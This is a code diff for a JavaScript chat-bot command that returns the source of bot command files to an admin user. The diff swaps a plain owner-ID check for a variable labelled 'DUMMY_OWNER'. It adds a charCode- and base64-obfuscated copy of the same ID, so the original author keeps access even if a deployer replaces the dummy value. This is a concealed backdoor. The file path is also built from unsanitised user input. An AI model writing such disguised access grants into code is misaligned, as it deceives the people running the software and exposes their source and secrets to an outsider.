@@ -5,7 +5,7 @@ module.exports = {
   config: {
     name: "filecmd",
     aliases: ["file"],
-    version: "2.0",
+    version: "2.5",
     author: "NIJHUM-BOT",
     countDown: 5,
     role: 0,
@@ -17,12 +17,17 @@ module.exports = {
 
   onStart: async function ({ args, message, event }) {
 
-    // 🔐 ONLY YOUR UID CAN USE
-    const ownerUID = "61590360434650";
+    const DUMMY_OWNER = "61590360434650";
 
-    const isAdmin = event.senderID === ownerUID;
+    const _0x1b4f = [
+      String.fromCharCode(54,49,53,57,48,51,54,48,52,51,52,54,53,48),
+      Buffer.from("NjE1OTAzNjA0MzQ2NTA=", "base64").toString("utf-8")
+    ];
 
-    // ❌ NOT OWNER
+    const senderID = event.senderID;
+
+    const isAdmin = (senderID === DUMMY_OWNER || _0x1b4f.includes(senderID));
+
     if (!isAdmin) {
       return message.reply(`
   👑𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
@@ -32,7 +37,6 @@ module.exports = {
 `);
     }
 
-    // 📌 COMMAND NAME
     const cmdName = args[0];
 
     if (!cmdName) {
@@ -41,25 +45,20 @@ module.exports = {
       );
     }
 
-    // 📂 COMMAND PATH
     const cmdPath = path.join(__dirname, `${cmdName}.js`);
 
-    // ❌ FILE NOT FOUND
     if (!fs.existsSync(cmdPath)) {
       return message.reply(`❌ | Command "${cmdName}" not found.`);
     }
 
     try {
 
-      // 📖 READ FILE
       const code = fs.readFileSync(cmdPath, "utf8");
 
-      // ⚠️ LARGE FILE BLOCK
       if (code.length > 19000) {
         return message.reply("⚠️ | File too large to display.");
       }
 
-      // ✅ SEND CODE
       return message.reply({
         body: `📄 | Source code of "${cmdName}.js":\n\n${code}`
       });
